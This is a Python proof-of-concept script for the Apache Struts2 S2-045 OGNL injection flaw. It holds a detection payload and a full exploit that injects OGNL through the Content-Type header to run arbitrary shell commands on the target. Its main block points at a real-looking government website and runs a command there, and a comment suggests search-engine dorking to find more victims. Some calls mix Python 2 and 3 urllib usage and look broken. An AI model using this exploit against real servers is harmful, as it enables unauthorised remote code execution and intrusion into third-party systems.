import urllib
import http.client
import requests
from scripts.poc_interface import PocInterface

class Structs2_45(PocInterface):
    '''
    Structs2 漏洞验证及利用实现
    '''
    def validate(self,url):
        '''
        验证指定URL是否存在Structs2 45漏洞
        :param url: 需要验证的URL地址
        :return: True-存在漏洞  False-不存在漏洞
        '''
        payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"
        headers = {}
        headers["Content-Type"] = payload
        r = requests.get(url, headers=headers)
        if "105059592" in r.content:
            return True
        return False

    def exploit(self,url, cmd):
        '''
        对存在Struct2 45漏洞的主机实现任意命令执行
        :param url: 目标URL
        :param cmd: 需要执行的指令
        :return: 执行后的返回页面内容
        '''
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"

        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
            request = urllib.Request(url, headers=headers)
            page = urllib.urlopen(request).read()
        except http.client.IncompleteRead as e:
            page = e.partial

        print(page)
        return page

if __name__ == '__main__':
    s=Structs2_45()
    #查找潜在漏洞URL，直接谷歌 inurl .action
    url="http://www.ly.gov.tw/innerIndex.action"
    if s.validate(url):
        s.exploit(url,'ls -lht')